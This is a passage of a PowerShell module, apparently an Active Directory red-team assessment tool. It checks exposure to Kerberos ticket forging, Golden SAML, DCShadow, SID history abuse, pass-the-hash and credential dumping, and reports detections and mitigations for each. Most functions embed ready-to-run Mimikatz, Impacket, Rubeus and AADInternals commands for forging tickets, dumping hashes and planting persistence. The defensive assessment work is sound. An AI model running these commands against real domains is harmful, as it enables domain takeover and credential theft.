        $daysSince = ([DateTime]::UtcNow - $krbtgt.PasswordLastSet.ToUniversalTime()).Days
    }

    $findings = @([PSCustomObject]@{
        KRBTGTPasswordAge    = if ($daysSince -ge 0) { "$daysSince days" } else { 'Unknown' }
        GoldenTicketRisk     = if ($daysSince -gt 180) { 'CRITICAL — >180 days' } elseif ($daysSince -gt 90) { 'HIGH — >90 days' } else { 'LOW — recently rotated' }
        WhatGoldenTicketGives = 'Persistent DA access valid for MaxTicketAge, survives password resets, works offline'
        RequiredInfo         = 'KRBTGT NTLM hash, Domain SID, target username, domain FQDN'
    })

    return New-RedTeamResult `
        -AttackType      'Golden Ticket' `
        -MITRE           'T1558.001' `
        -SafeMode        $SafeMode `
        -RiskLevel       'Critical' `
        -ExploitableCount 1 `
        -Findings        $findings `
        -AttackPath      "1. Obtain KRBTGT hash (via DCSync, NTDS.dit, or Skeleton Key extraction).`n2. Collect: Domain SID, KRBTGT NTLM hash, target username, domain FQDN.`n3. Forge TGT offline using Mimikatz/Impacket.`n4. Inject ticket into session (pass-the-ticket).`n5. Ticket valid until KRBTGT rotated — current age: $daysSince days." `
        -DetectionEvents @('4769 (unusual TGT lifetime)', '4672 (special logon)', 'MDI: Golden Ticket detection (anomalous TGT)') `
        -Mitigations     @('Rotate KRBTGT password twice every 180 days', 'Deploy MDI to detect anomalous TGT usage', 'Implement Privileged Access Workstations', 'Enable Protected Users security group') `
        -Tools           @('Mimikatz (kerberos::golden)', 'Impacket/ticketer.py', 'Rubeus (forged ticket)') `
        -Commands        @(
            '# Get KRBTGT hash (requires DA)',
            'lsadump::dcsync /domain:domain.com /user:krbtgt',
            '',
            '# Forge Golden Ticket',
            'kerberos::golden /user:FakeAdmin /domain:domain.com /sid:S-1-5-21-xxx /krbtgt:<NTLM> /ptt',
            '',
            '# Impacket',
            'python3 ticketer.py -nthash <KRBTGT_HASH> -domain-sid S-1-5-21-xxx -domain domain.com FakeAdmin'
        )
}

#endregion

#region 12 — Silver Ticket

function Invoke-RedTeamSilverTicket {
    <#
    .SYNOPSIS
        Red team simulation for Silver Ticket attack surface (T1558.002).
    #>
    [CmdletBinding()]
    param(
        [hashtable]$ADData = @{},
        [bool]$SafeMode = $true
    )

    $users = @(if ($ADData.ContainsKey('Users')) { $ADData.Users } else { @() })

    $rc4ServiceAccounts = @($users | Where-Object {
        $_.ServicePrincipalNames -and $_.ServicePrincipalNames.Count -gt 0 -and $_.Enabled -eq $true
    } | Where-Object {
        $encType = if ($null -ne $_.'msDS-SupportedEncryptionTypes') { [int]$_.'msDS-SupportedEncryptionTypes' } else { 0 }
        ($encType -band 24) -eq 0
    })

    $findings = @($rc4ServiceAccounts | ForEach-Object {
        [PSCustomObject]@{
            Account  = $_.SamAccountName
            SPNs     = ($_.ServicePrincipalNames -join '; ')
            EncType  = 'RC4 (silver ticket forgeable without KDC)'
        }
    })

    return New-RedTeamResult `
        -AttackType      'Silver Ticket' `
        -MITRE           'T1558.002' `
        -SafeMode        $SafeMode `
        -RiskLevel       'High' `
        -ExploitableCount $rc4ServiceAccounts.Count `
        -Findings        $findings `
        -AttackPath      "1. Obtain service account NTLM hash (Kerberoast offline, PTH, or secretsdump).`n2. Forge service ticket (TGS) for any SPN without contacting KDC.`n3. Access service as any user — bypasses most KDC-side controls.`n4. Silver tickets do NOT show in DC event logs (KDC not involved).`nRC4-vulnerable service accounts: $($rc4ServiceAccounts.Count)" `
        -DetectionEvents @('Service-side audit logs', 'Anomalous service access (MDI)', 'No KDC events (detection gap)') `
        -Mitigations     @('Enforce AES encryption (msDS-SupportedEncryptionTypes=24)', 'Use gMSA for service accounts', 'Enable PAC validation on services', 'Deploy MDI for Silver Ticket detection') `
        -Tools           @('Mimikatz (kerberos::silver)', 'Impacket/ticketer.py', 'Rubeus') `
        -Commands        @(
            '# Forge Silver Ticket',
            'kerberos::silver /user:FakeUser /domain:domain.com /sid:S-1-5-21-xxx /target:server.domain.com /service:cifs /rc4:<SERVICE_HASH> /ptt',
            '',
            '# Impacket',
            'python3 ticketer.py -nthash <SERVICE_HASH> -domain-sid S-1-5-21-xxx -domain domain.com -spn cifs/server.domain.com FakeUser'
        )
}

#endregion

#region 13 — Golden SAML

function Invoke-RedTeamGoldenSAML {
    <#
    .SYNOPSIS
        Red team simulation for Golden SAML attack (T1606.002).
    #>
    [CmdletBinding()]
    param(
        [hashtable]$ADData = @{},
        [bool]$SafeMode = $true
    )

    $users = @(if ($ADData.ContainsKey('Users')) { $ADData.Users } else { @() })
    $adfsAccounts = @($users | Where-Object { $_.SamAccountName -match '^(adfssvc|adfs|adfsgmsa|_adfs)' })
    $adfsPresent = $adfsAccounts.Count -gt 0

    $findings = @([PSCustomObject]@{
        ADFSDetected     = $adfsPresent
        ADFSAccounts     = if ($adfsAccounts.Count -gt 0) { ($adfsAccounts | Select-Object -ExpandProperty SamAccountName) -join ', ' } else { 'None detected' }
        GoldenSAMLRisk   = if ($adfsPresent) { 'Present — AD FS token signing key theft enables persistent cloud access' } else { 'Not Applicable — AD FS not detected' }
        Targets          = 'Microsoft 365, Azure, AWS ADFS federation, any SAML SP'
    })

    return New-RedTeamResult `
        -AttackType      'Golden SAML' `
        -MITRE           'T1606.002' `
        -SafeMode        $SafeMode `
        -RiskLevel       'Critical' `
        -ExploitableCount $adfsAccounts.Count `
        -Findings        $findings `
        -AttackPath      "1. Compromise AD FS server (Tier 0).`n2. Export token-signing certificate private key via DPAPI or Mimikatz.`n3. Use AADInternals/ADFSpoof to forge SAML tokens for any federated user.`n4. Access Microsoft 365, Azure, or any SAML-enabled service as target user.`n5. Golden SAML tokens persist even after password resets — until cert rotation.`nAD FS detected: $adfsPresent" `
        -DetectionEvents @('AD FS event 403/501 (token issuance)', 'Azure AD sign-in anomalies', 'UEBA on cloud access patterns') `
        -Mitigations     @('Protect AD FS token signing cert with HSM', 'Restrict AD FS server admin access (Tier 0)', 'Monitor AD FS token issuance events', 'Consider migrating from AD FS to AAD SSO/PTA') `
        -Tools           @('AADInternals (New-AADIntSAMLToken)', 'ADFSpoof', 'Mimikatz (token key export)', 'Golden SAML PoC') `
        -Commands        @(
            '# Check AD FS token signing cert (AD FS admin)',
            'Get-AdfsCertificate -CertificateType Token-Signing',
            '',
            '# AADInternals — export token signing cert (requires AD FS admin)',
            'Export-AADIntADFSSigningCertificate -Filename adfs_signing.pfx',
            '',
            '# Forge SAML token',
            'New-AADIntSAMLToken -ImmutableID <UPN_ID> -Issuer <ADFS_ISSUER> -PfxFileName adfs_signing.pfx -PfxPassword pass'
        )
}

#endregion

#region 14 — Entra Connect

function Invoke-RedTeamEntraConnect {
    <#
    .SYNOPSIS
        Red team simulation for Entra (Azure AD) Connect compromise (T1098.001).
    #>
    [CmdletBinding()]
    param(
        [hashtable]$ADData = @{},
        [bool]$SafeMode = $true
    )

    $users = @(if ($ADData.ContainsKey('Users')) { $ADData.Users } else { @() })
    $msolAccounts = @($users | Where-Object { $_.SamAccountName -match '^MSOL_|^AAD_' })

    $findings = @($msolAccounts | ForEach-Object {
        [PSCustomObject]@{
            Account      = $_.SamAccountName
            PasswordAge  = if ($_.PasswordLastSet) { "$([int]([DateTime]::UtcNow - $_.PasswordLastSet.ToUniversalTime()).Days) days" } else { 'Unknown' }
            Risk         = 'DCSync-equivalent rights + cloud tenant access'
            ExploitPath  = 'Compromise MSOL_ account → DCSync all hashes → cloud tenant admin'
        }
    })

    return New-RedTeamResult `
        -AttackType      'Microsoft Entra Connect Compromise' `
        -MITRE           'T1098.001' `
        -SafeMode        $SafeMode `
        -RiskLevel       'Critical' `
        -ExploitableCount $msolAccounts.Count `
        -Findings        $findings `
        -AttackPath      "1. Identify MSOL_* / AAD_* sync accounts (any auth user can enumerate).`n2. Compromise the AAD Connect server (Tier 0 asset) or MSOL_ account credentials.`n3. Use MSOL_ account to DCSync all on-prem hashes.`n4. Alternatively: extract AAD Connect stored credentials (database/DPAPI).`n5. Use extracted cloud credentials for tenant admin access.`nMSOL accounts found: $($msolAccounts.Count)" `
        -DetectionEvents @('4662 (replication from MSOL_ account)', 'Azure AD: sync service principal sign-ins', 'MDI: DCSync from non-DC') `
        -Mitigations     @('Protect AAD Connect server as Tier 0', 'Monitor MSOL_ account authentication', 'Use AAD Connect Cloud Sync (less privileged)', 'Apply Conditional Access to MSOL_ accounts') `
        -Tools           @('AADInternals', 'AdSync credential extraction', 'Mimikatz (DCSync via MSOL_)', 'ROADtools') `
        -Commands        @(
            '# Enumerate MSOL accounts',
            'Get-ADUser -Filter {SamAccountName -like "MSOL_*" -or SamAccountName -like "AAD_*"} -Properties PasswordLastSet,MemberOf',
            '',
            '# AADInternals — extract AAD Connect credentials from server (local admin)',
            'Get-AADIntSyncCredentials',
            '',
            '# DCSync using MSOL_ credentials',
            'python3 secretsdump.py DOMAIN/MSOL_xxx:password@<DC_IP> -just-dc-ntlm'
        )
}

#endregion

#region 15 — Trust Bypass

function Invoke-RedTeamTrustBypass {
    <#
    .SYNOPSIS
        Red team simulation for one-way domain trust bypass via SID history (T1134.005).
    #>
    [CmdletBinding()]
    param(
        [hashtable]$ADData = @{},
        [bool]$SafeMode = $true
    )

    $trusts = @(if ($ADData.ContainsKey('Trusts')) { $ADData.Trusts } else { @() })

    $vulnerableTrusts = @($trusts | Where-Object {
        ($_.TrustAttributes -band 4) -eq 0  # SID filtering disabled (quarantine flag not set)
    })

    $findings = @($trusts | ForEach-Object {
        $sidFiltering = if (($_.TrustAttributes -band 4) -ne 0) { 'Enabled' } else { 'DISABLED — exploitable' }
        [PSCustomObject]@{
            TrustPartner   = if ($_.TrustPartner) { $_.TrustPartner } else { $_.Name }
            TrustDirection = $_.TrustDirection
            TrustType      = $_.TrustType
            SIDFiltering   = $sidFiltering
            Exploitable    = ($sidFiltering -ne 'Enabled')
        }
    })

    return New-RedTeamResult `
        -AttackType      'One-Way Domain Trust Bypass' `
        -MITRE           'T1134.005' `
        -SafeMode        $SafeMode `
        -RiskLevel       'High' `
        -ExploitableCount $vulnerableTrusts.Count `
        -Findings        $findings `
        -AttackPath      "1. Enumerate trust relationships (any authenticated user).`n2. Identify trusts with SID filtering disabled.`n3. Add foreign domain SID to SID history of a compromised account.`n4. Authenticate across trust — foreign SIDs in SID history grant access to trusted domain resources.`n5. If Enterprise Admin SID added: full forest compromise.`nVulnerable trusts (no SID filtering): $($vulnerableTrusts.Count)" `
        -DetectionEvents @('4675 (SIDs filtered)', '4655', 'MDI: SID History injection') `
        -Mitigations     @('Enable SID filtering on all trusts', 'Enable SID filtering quarantine on external trusts', 'Audit SID history on all accounts', 'Monitor cross-trust authentications') `
        -Tools           @('Mimikatz (lsadump::trust)', 'PowerView (Get-DomainTrust)', 'Impacket', 'Rubeus') `
        -Commands        @(
            '# Enumerate trusts and SID filtering',
            'Get-ADTrust -Filter * | Select-Object Name, TrustDirection, TrustAttributes, SIDFilteringQuarantined',
            '',
            '# Check SID filtering status',
            'netdom trust <trusted_domain> /domain:<trusting_domain> /quarantine',
            '',
            '# Impacket — get trust key',
            'python3 secretsdump.py domain/da:pass@<DC_IP> -just-dc-user trust_account'
        )
}

#endregion

#region 16 — SID History

function Invoke-RedTeamSIDHistory {
    <#
    .SYNOPSIS
        Red team simulation for SID History abuse (T1134.005).
    #>
    [CmdletBinding()]
    param(
        [hashtable]$ADData = @{},
        [bool]$SafeMode = $true
    )

    $users = @(if ($ADData.ContainsKey('Users')) { $ADData.Users } else { @() })
    $groups = @(if ($ADData.ContainsKey('Groups')) { $ADData.Groups } else { @() })

    # Known privileged group RIDs
    $privilegedRIDs = @('500', '512', '518', '519', '520', '544')

    $withSIDHistory = @($users | Where-Object { $_.SIDHistory -and $_.SIDHistory.Count -gt 0 })
    $privilegedSIDs = @($withSIDHistory | Where-Object {
        foreach ($sid in $_.SIDHistory) {
            $rid = ($sid -split '-')[-1]
            if ($rid -in $privilegedRIDs) { return $true }
        }
        return $false
    })

    $findings = @($withSIDHistory | ForEach-Object {
        $sids = @($_.SIDHistory | ForEach-Object { $_.ToString() })
        $isPriv = $false
        foreach ($sid in $sids) {
            $rid = ($sid -split '-')[-1]
            if ($rid -in $privilegedRIDs) { $isPriv = $true }
        }
        [PSCustomObject]@{
            Account       = $_.SamAccountName
            SIDHistory    = ($sids -join ', ')
            IsPrivileged  = $isPriv
        }
    })

    return New-RedTeamResult `
        -AttackType      'SID History Compromise' `
        -MITRE           'T1134.005' `
        -SafeMode        $SafeMode `
        -RiskLevel       'Critical' `
        -ExploitableCount $privilegedSIDs.Count `
        -Findings        $findings `
        -AttackPath      "1. Obtain DA or equivalent.`n2. Add privileged group SID (e.g., Enterprise Admins S-1-5-21-...-519) to SID history of a low-privilege account.`n3. The SID History is included in Kerberos PAC — grants all rights of that group.`n4. Account appears normal in AD but has hidden Enterprise Admin rights.`n5. Survives account monitoring as the account itself is not in privileged groups.`nAccounts with SID history: $($withSIDHistory.Count) (privileged: $($privilegedSIDs.Count))" `
        -DetectionEvents @('4765 (SID history added)', '4766 (SID history add failed)', 'MDI: SID History anomaly') `
        -Mitigations     @('Audit all accounts for SID history', 'Clear SID history after domain migrations', 'Enable SID filtering on trusts', 'Monitor event 4765') `
        -Tools           @('Mimikatz (sid::patch + sid::add)', 'PowerView (Get-DomainUser -Properties SIDHistory)', 'DSInternals') `
        -Commands        @(
            '# Enumerate accounts with SID history',
            'Get-ADUser -Filter * -Properties SIDHistory | Where-Object { $_.SIDHistory } | Select-Object SamAccountName, SIDHistory',
            '',
            '# Add SID history (requires DA + seDebugPrivilege)',
            'privilege::debug',
            'sid::patch',
            'sid::add /sam:targetuser /new:S-1-5-21-...-519'
        )
}

#endregion

#region 17 — Skeleton Key

function Invoke-RedTeamSkeletonKey {
    <#
    .SYNOPSIS
        Red team simulation for Skeleton Key malware detection/indicators (T1556.001).
    #>
    [CmdletBinding()]
    param(
        [hashtable]$ADData = @{},
        [bool]$SafeMode = $true
    )

    $dcs = @(if ($ADData.ContainsKey('DomainControllers')) { $ADData.DomainControllers } else { @() })

    $skeletonKeyDrivers = @('mimidrv.sys', 'WdigestPatch.dll', 'lsaext.dll')
    $indicators = [System.Collections.Generic.List[object]]::new()

    foreach ($dc in $dcs) {
        $dcName = if ($dc.HostName) { $dc.HostName } elseif ($dc.Name) { $dc.Name } else { continue }

        if (-not $SafeMode) {
            # Check for known Skeleton Key indicators via WMI (read-only)
            try {
                $processes = Get-WmiObject -ComputerName $dcName -Class Win32_Process -ErrorAction SilentlyContinue |
                    Where-Object { $_.Name -match 'lsass' }
                $indicators.Add([PSCustomObject]@{ DC = $dcName; Check = 'LSASS running'; Status = if ($processes) { 'Running (normal)' } else { 'Not found' } })
            }
            catch { Write-Verbose "WMI check on $dcName failed: $_" }
        }
        else {
            $indicators.Add([PSCustomObject]@{
                DC          = $dcName
                Note        = 'Safe mode — would check for: known Skeleton Key drivers in LSASS module list, mimidrv.sys presence, WDigest patch indicators'
                Indicators  = $skeletonKeyDrivers -join ', '
            })
        }
    }

    return New-RedTeamResult `
        -AttackType      'Skeleton Key' `
        -MITRE           'T1556.001' `
        -SafeMode        $SafeMode `
        -RiskLevel       'Critical' `
        -ExploitableCount $dcs.Count `
        -Findings        $indicators.ToArray() `
        -AttackPath      "1. Obtain DA access to domain controller.`n2. Inject Skeleton Key patch into LSASS via Mimikatz: misc::skeleton.`n3. All accounts can now authenticate with either their real password OR the skeleton key ('mimikatz').`n4. Survives DC restarts if persistent variant used.`n5. Allows DA to masquerade as any domain user.`nDCs to target: $($dcs.Count)" `
        -DetectionEvents @('7045 (new service installed)', '4688 (process creation — mimikatz)', 'MDI: Skeleton Key activity', 'LSASS module load events') `
        -Mitigations     @('Enable Credential Guard (blocks LSASS injection)', 'Enable LSASS PPL (Protected Process Light)', 'Deploy EDR on all DCs', 'Monitor for mimidrv.sys and unusual LSASS modules') `
        -Tools           @('Mimikatz (misc::skeleton)', 'Empire', 'Metasploit (kiwi)') `
        -Commands        @(
            '# Inject Skeleton Key (requires DA, local LSASS access)',
            'privilege::debug',
            'misc::skeleton',
            '',
            '# Detect via LSASS modules (requires admin)',
            '$proc = Get-Process lsass',
            '$proc.Modules | Select-Object FileName | Where-Object { $_.FileName -match "mimidrv|WdigestPatch|lsaext" }',
            '',
            '# Remote check',
            'Invoke-Command -ComputerName <DC> -ScriptBlock { (Get-Process lsass).Modules | Select-Object FileName }'
        )
}

#endregion

#region 18 — Pass the Hash

function Invoke-RedTeamPassTheHash {
    <#
    .SYNOPSIS
        Red team surface assessment for Pass-the-Hash (T1550.002).
        NEVER performs actual PTH.
    #>
    [CmdletBinding()]
    param(
        [hashtable]$ADData = @{},
        [bool]$SafeMode = $true
    )

    $computers = @(if ($ADData.ContainsKey('Computers')) { $ADData.Computers } else { @() })
    $ntlmData  = @(if ($ADData.ContainsKey('NtlmSettings')) { $ADData.NtlmSettings } else { @() })

    $noLAPS = @($computers | Where-Object { $_.Enabled -eq $true -and -not $_.'ms-Mcs-AdmPwd' -and -not $_.'msLAPS-Password' })
    $ntlmv1Allowed = $false
    foreach ($n in $ntlmData) {
        if ($n.LmCompatibilityLevel -and [int]$n.LmCompatibilityLevel -lt 3) { $ntlmv1Allowed = $true; break }
    }

    $findings = @([PSCustomObject]@{
        ComputersWithoutLAPS = $noLAPS.Count
        NTLMv1Allowed        = $ntlmv1Allowed
        PTHSurface           = if ($noLAPS.Count -gt 0) { 'HIGH — shared local admin passwords enable lateral movement' } else { 'LOW — LAPS deployed' }
        Note                 = 'SIMULATION ONLY — no PTH performed'
    })

    return New-RedTeamResult `
        -AttackType      'Pass the Hash' `
        -MITRE           'T1550.002' `
        -SafeMode        $true `
        -RiskLevel       'High' `
        -ExploitableCount $noLAPS.Count `
        -Findings        $findings `
        -AttackPath      "SURFACE ANALYSIS ONLY (no PTH performed).`n1. Obtain NTLM hash via Mimikatz sekurlsa::logonpasswords, secretsdump, or Kerberoast.`n2. Use hash directly with PtH-capable tools (no password cracking needed).`n3. Targets without LAPS: $($noLAPS.Count) computers — same local admin hash across machines.`n4. NTLMv1 allowed: $ntlmv1Allowed (if true, hashes extractable from challenge-response)." `
        -DetectionEvents @('4624 logon type 3 with NTLM', '4776 NTLM auth', 'MDI: PTH activity') `
        -Mitigations     @('Deploy LAPS on all computers', 'Disable NTLMv1 (LmCompatibilityLevel=5)', 'Enable Restricted Admin Mode', 'Disable local admin accounts where possible', 'Deploy MDI') `
        -Tools           @('Mimikatz (sekurlsa::pth)', 'Impacket (smbclient.py, psexec.py)', 'CrackMapExec', 'Metasploit') `
        -Commands        @(
            '# PTH with Mimikatz (authorised testing only)',
            'sekurlsa::pth /user:Administrator /domain:DOMAIN /ntlm:<HASH> /run:cmd.exe',
            '',
            '# Impacket',
            'python3 psexec.py DOMAIN/Administrator@<TARGET_IP> -hashes :<NTLM_HASH>',
            '',
            '# CrackMapExec — sweep (authorised only)',
            'cme smb <SUBNET> -u Administrator -H <HASH> --local-auth'
        )
}

#endregion

#region 19 — Pass the Ticket

function Invoke-RedTeamPassTheTicket {
    <#
    .SYNOPSIS
        Red team simulation for Pass-the-Ticket attack surface (T1550.003).
    #>
    [CmdletBinding()]
    param(
        [hashtable]$ADData = @{},
        [bool]$SafeMode = $true
    )

    $users     = @(if ($ADData.ContainsKey('Users'))     { $ADData.Users }     else { @() })
    $computers = @(if ($ADData.ContainsKey('Computers')) { $ADData.Computers } else { @() })
    $dcs       = @(if ($ADData.ContainsKey('DomainControllers')) { $ADData.DomainControllers } else { @() })

    $unconstrained = @(
        ($users     | Where-Object { $_.TrustedForDelegation -eq $true -and $_.Enabled -eq $true }),
        ($computers | Where-Object {
            $_.TrustedForDelegation -eq $true -and $_.Enabled -eq $true -and
            ($_.DistinguishedName -notmatch 'OU=Domain Controllers' -and $_.Name -notin $dcs.Name)
        })
    ) | Where-Object { $_ }

    $findings = @([PSCustomObject]@{
        UnconstrainedDelegationTargets = @($unconstrained).Count
        ForwardableTGTsAtRisk          = 'Any user authenticating to unconstrained delegation hosts'
        TicketTheftMethods             = 'Rubeus dump, Mimikatz sekurlsa::tickets, Task Scheduler ticket'
        PTTNote                        = 'Tickets stolen from memory, injected into current session'
    })

    return New-RedTeamResult `
        -AttackType      'Pass the Ticket' `
        -MITRE           'T1550.003' `
        -SafeMode        $SafeMode `
        -RiskLevel       'High' `
        -ExploitableCount @($unconstrained).Count `
        -Findings        $findings `
        -AttackPath      "1. Compromise a host with unconstrained delegation ($(@($unconstrained).Count) targets).`n2. Wait for or coerce a privileged account to authenticate (PrinterBug, PetitPotam).`n3. Extract TGTs from LSASS: Rubeus dump /service:krbtgt /nowrap.`n4. Inject into current session: Rubeus ptt /ticket:<base64>.`n5. Access resources as impersonated user." `
        -DetectionEvents @('4769 (TGT requested)', '4624 (logon with injected ticket)', 'MDI: Ticket theft detection') `
        -Mitigations     @('Remove unconstrained delegation', 'Add privileged accounts to Protected Users group', 'Enable Credential Guard', 'Deploy MDI', 'Use constrained/RBCD delegation') `
        -Tools           @('Rubeus (dump/ptt)', 'Mimikatz (sekurlsa::tickets)', 'Kekeo', 'PowerView') `
        -Commands        @(
            '# Dump tickets from memory (requires admin on host)',
            'Rubeus.exe dump /service:krbtgt /nowrap',
            '',
            '# Inject ticket',
            'Rubeus.exe ptt /ticket:<base64_ticket>',
            '',
            '# Mimikatz',
            'sekurlsa::tickets /export',
            'kerberos::ptt ticket.kirbi'
        )
}

#endregion

#region 20 — DCShadow

function Invoke-RedTeamDCShadow {
    <#
    .SYNOPSIS
        Red team simulation for DCShadow attack (T1207).
    #>
    [CmdletBinding()]
    param(
        [hashtable]$ADData = @{},
        [bool]$SafeMode = $true
    )

    $acls = @(if ($ADData.ContainsKey('ACLs')) { $ADData.ACLs } else { @() })
    $dcs  = @(if ($ADData.ContainsKey('DomainControllers')) { $ADData.DomainControllers } else { @() })

    # Check for replication rights (required for DCShadow)
    $hasReplicationRights = $false
    if (-not $SafeMode) {
        try {
            $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
            $replicaACEs = @($acls | Where-Object {
                $_.IdentityReference -match [regex]::Escape(($currentUser -split '\\')[-1]) -and
                ($_.ObjectType -eq '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2' -or
                 $_.ActiveDirectoryRights -match 'ExtendedRight')
            })
            $hasReplicationRights = ($replicaACEs.Count -gt 0)
        }
        catch { Write-Verbose "Replication rights check failed: $_" }
    }

    $findings = @([PSCustomObject]@{
        DCCount                = $dcs.Count
        HasReplicationRights   = if ($SafeMode) { 'Not checked (safe mode)' } else { $hasReplicationRights.ToString() }
        RequiredPrivileges     = 'DA or account with DS-Install-Replica + write to Configuration NC'
        DCShadowPersistence    = 'Can inject arbitrary AD objects/attributes without detection by standard AD audit'
        ImpactExample          = 'Add SID history, modify group membership, set msDS-AllowedToActOnBehalfOfOtherIdentity'
    })

    return New-RedTeamResult `
        -AttackType      'DCShadow' `
        -MITRE           'T1207' `
        -SafeMode        $SafeMode `
        -RiskLevel       'Critical' `
        -ExploitableCount 1 `
        -Findings        $findings `
        -AttackPath      "1. Obtain DA or account with replication rights.`n2. Register a rogue DC in Configuration NC using Mimikatz lsadump::dcshadow /object /push.`n3. Temporarily register workstation as DC (requires replication SPN + nTDSDSA object).`n4. Push malicious AD attribute changes via replication.`n5. Deregister rogue DC — changes persist, no trace in standard AD audit logs.`n6. Example: Add SID history to escalate, backdoor group memberships." `
        -DetectionEvents @('5136 (DS object modified)', 'Netlogon/replication traffic anomalies', 'MDI: DCShadow detection (nTDSDSA creation)') `
        -Mitigations     @('Monitor nTDSDSA object creation in Configuration NC', 'Deploy MDI (detects DCShadow)', 'Restrict DS-Install-Replica rights', 'Audit Configuration NC changes', 'Enable advanced DS access auditing') `
        -Tools           @('Mimikatz (lsadump::dcshadow)', 'SharpDump', 'PowerView') `
        -Commands        @(
            '# DCShadow with Mimikatz (requires DA)',
            '# Terminal 1: Register rogue DC',
            'lsadump::dcshadow /object:cn=targetuser,dc=domain,dc=com /attribute:sidHistory /value:S-1-5-21-...-519',
            '',
            '# Terminal 2: Push changes',
            'lsadump::dcshadow /push',
            '',
            '# Detect: check for unexpected nTDSDSA objects',
            'Get-ADObject -SearchBase "CN=Sites,CN=Configuration,DC=domain,DC=com" -Filter {objectClass -eq "nTDSDSA"} | Select-Object DistinguishedName,Created'
        )
}

#endregion

#region CredentialDumping (T1003)

function Invoke-RedTeamCredentialDumping {
    <#
    .SYNOPSIS
        Red team simulation for Credential Dumping from Windows systems (T1003).
    .DESCRIPTION
        In safe mode returns metadata: attack path, affected DC/workstation targets,
        MITRE ATT&CK details, detection events, and mitigations.
        Requires -SafeMode:$false for active read-only enumeration of credential
        protection settings (WDigest, Credential Guard readiness, LSASS PPL, legacy OS).
        No exploitation or credential extraction is performed at any setting.
    #>
    [CmdletBinding()]
    param(
        [hashtable]$ADData   = @{},
        [bool]$SafeMode      = $true
    )

    $dcs       = @(if ($ADData.ContainsKey('DomainControllers')) { $ADData.DomainControllers } else { @() })
    $computers = @(if ($ADData.ContainsKey('Computers'))         { $ADData.Computers }         else { @() })
    $users     = @(if ($ADData.ContainsKey('Users'))             { $ADData.Users }             else { @() })

    # Active enumeration: check for Credential Guard / LSASS protection gaps
    $targets = [System.Collections.Generic.List[string]]::new()
    $legacyComputerCount = 0
    if (-not $SafeMode) {
        foreach ($dc in $dcs) {
            if ($dc -and $dc.PSObject.Properties['DNSHostName'] -and $dc.DNSHostName) {
                $osName = if ($dc.PSObject.Properties['OperatingSystem']) { $dc.OperatingSystem } else { 'Unknown' }
                $targets.Add("DC: $($dc.DNSHostName) — OS: $osName")
            }
        }
        $legacyComputers = @($computers | Where-Object {
            $_ -and $_.PSObject.Properties['OperatingSystem'] -and
            $_.OperatingSystem -match 'Windows (XP|Vista|7|2003|2008( R2)?)'
        })
        $legacyComputerCount = $legacyComputers.Count
        foreach ($c in $legacyComputers) {
            $targets.Add("Legacy OS: $($c.Name) — $($c.OperatingSystem) (WDigest cleartext risk)")
        }
        $privUsers = @($users | Where-Object {
            $_ -and $_.PSObject.Properties['AdminCount'] -and $_.AdminCount -eq 1
        })
        if ($privUsers.Count -gt 0) {
            $targets.Add("$($privUsers.Count) privileged account(s) with AdminCount=1 (high-value credential targets)")
        }
    }

    return New-RedTeamResult `
        -AttackName      'Credential Dumping from Windows Systems' `
        -MitreId         'T1003' `
        -MitreName       'OS Credential Dumping' `
        -SafeMode        $SafeMode `
        -Targets         $(if ($targets.Count -gt 0) { $targets.ToArray() } else { @("Domain Controllers: $($dcs.Count)", "Domain-joined computers: $($computers.Count)") }) `
        -AttackPath      "1. Gain local SYSTEM/admin on target host (DC, workstation, or server).`n2. Dump LSASS credentials via Mimikatz: sekurlsa::logonpasswords or Rubeus dump.`n3. Alternatively use ntdsutil (IFM) or VSS to copy NTDS.dit + SYSTEM hive off DCs.`n4. Extract hashes from NTDS.dit offline: Invoke-DSExtract / secretsdump.py.`n5. Crack hashes offline with hashcat or use NTLM hashes directly (PTH).`nLegacy OS targets (WDigest=ON): $legacyComputerCount" `
        -DetectionEvents @('4688 (process creation — mimikatz/procdump)', '4656/4663 (LSASS handle access — requires SACL)', '7036 (VSS service start on DC)', 'Sysmon EID 10 (LSASS access)', 'MDI: Credential Access alert') `
        -Mitigations     @('Enable Credential Guard on all DCs and PAWs (VBS+LSASS)', 'Enable LSASS PPL (RunAsPPL=1 in LSA registry)', 'Disable WDigest (UseLogonCredential=0 via GPO)', 'Deploy EDR with LSASS protection on all DCs', 'Restrict VSS/ntdsutil access on DCs (Tier 0 hardening)', 'Enable Windows Defender Credential Guard for hybrid scenarios') `
        -Tools           @('Mimikatz (sekurlsa::logonpasswords, lsadump::dcsync)', 'Rubeus (dump)', 'ntdsutil IFM / vssadmin / diskshadow', 'Impacket secretsdump.py', 'CrackMapExec (--ntds)', 'DSInternals (Convert-ADManagedServiceAccountCredential)') `
        -Commands        @(
            '# Blue team: Verify Credential Guard status',
            'Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" -Name "EnableVirtualizationBasedSecurity" -ErrorAction SilentlyContinue',
            '# Blue team: Verify LSASS PPL',
            'Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RunAsPPL" -ErrorAction SilentlyContinue',
            '# Blue team: Verify WDigest disabled',
            'Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name "UseLogonCredential" -ErrorAction SilentlyContinue',
            '# Blue team: Find legacy OS computers (WDigest cleartext risk)',
            'Get-ADComputer -Filter * -Properties OperatingSystem | Where-Object { $_.OperatingSystem -match "Windows (XP|Vista|7|2003|2008( R2)?)" } | Select-Object Name, OperatingSystem'
        )
}

#endregion

#region LateralMovement (T1021 / T1550)

function Invoke-RedTeamLateralMovement {
    <#
    .SYNOPSIS
        Red team simulation for Lateral Movement Path Abuse (T1021 / T1550).
    .DESCRIPTION
        In safe mode returns metadata: attack chain, path to Tier 0, MITRE ATT&CK
        references, detection events, and mitigations.
        Requires -SafeMode:$false for active read-only enumeration of delegation chains,
        AdminCount accounts, constrained delegation targets, and Tier boundary violations.
        No exploitation is performed at any setting.
    #>
    [CmdletBinding()]
    param(
        [hashtable]$ADData   = @{},
        [bool]$SafeMode      = $true
    )

    $users     = @(if ($ADData.ContainsKey('Users'))             { $ADData.Users }             else { @() })
    $computers = @(if ($ADData.ContainsKey('Computers'))         { $ADData.Computers }         else { @() })
    $dcs       = @(if ($ADData.ContainsKey('DomainControllers')) { $ADData.DomainControllers } else { @() })

    $targets = [System.Collections.Generic.List[string]]::new()
    if (-not $SafeMode) {
        # Enumerate delegation chains
        $constrained = @($users + $computers | Where-Object {
